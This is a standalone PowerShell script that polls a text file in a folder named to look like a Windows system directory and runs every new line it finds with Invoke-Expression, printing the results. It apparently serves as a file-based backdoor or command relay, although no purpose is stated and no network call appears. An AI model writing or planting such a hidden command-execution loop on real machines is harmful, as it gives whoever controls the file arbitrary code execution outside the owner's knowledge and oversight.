#$counterInput = 0;
$lineCounter = 0;
$path = -join('C:\Program Files\Windows system\input.txt');

while (1) {
    

        $input = Get-Content $path | select-object -skip $lineCounter;
        if($input -ne $null){
            if($input.getType().Name -eq ""String""){
                $lineCounter += 1;
                $output = Invoke-Expression $input;
                Foreach($s in $output){
                    write-host $s;    
                }
            }else {
                $lineCounter += $input.length;
                Foreach($line in $input){
                        
                    $output = Invoke-Expression $line;
                    Foreach($s in $output){
                        write-host $s;  
                    }
                         
                }
            }    
        }
       
        
        
        
    
    start-sleep -Milliseconds 120;
};